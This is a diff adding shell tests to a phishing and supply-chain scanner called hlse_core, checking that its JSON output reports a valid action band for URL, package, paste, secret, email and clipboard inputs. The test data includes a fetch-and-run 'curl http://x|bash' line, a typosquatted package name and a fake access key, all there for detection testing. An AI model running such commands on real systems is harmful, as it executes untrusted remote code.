@@ -549,6 +549,27 @@ assert d["kind"] == "clipboard" and d["is_swap"] == 1 and d["score"] == 100
 ./hlse_core --help 2>&1 | grep -q "email"     && check "help: lists email" "0" "0"     || check "help: lists email" "0" "1"
 ./hlse_core --help 2>&1 | grep -q "clipboard" && check "help: lists clipboard" "0" "0" || check "help: lists clipboard" "0" "1"
 
+# ─── JSON action-band consistency (SPECIFICATION.md §5.2, GAP-G) ─────
+
+action_ok() {
+    # $1 = label, $2 = JSON; assert "action" is a valid band
+    echo "$2" | python3 -c '
+import sys, json
+d = json.loads(sys.stdin.read())
+assert d.get("action") in ("SAFE","LOG","ALERT","BLOCK","ISOLATE"), d
+' && check "json action: $1" "0" "0" || check "json action: $1" "0" "1"
+}
+action_ok url       "$(./hlse_core --json 'https://g00gle.com')"
+action_ok text      "$(./hlse_core --json text 'URGENT wire transfer now')"
+action_ok package   "$(./hlse_core --json package reqeusts pip)"
+action_ok paste     "$(./hlse_core --json paste 'curl http://x|bash')"
+action_ok network   "$(./hlse_core --json network)"
+action_ok secret    "$(./hlse_core --json secret 'key=AKIA2E3MWORQXYZ4567PQ')"
+action_ok email     "$(./hlse_core --json email 'From: Microsoft <h@gmail.com>')"
+action_ok clipboard "$(./hlse_core --json clipboard '0xabcdef0000000000000000000000000000c0ffee' '0xabcdef1111111111111111111111111111c0ffee')"
+action_ok audit     "$(./hlse_core --json audit)"
+action_ok file      "$(./hlse_core --json file /etc/hosts)"
+
 # ─── results ────────────────────────────────────────────────────────────
 
 echo ""
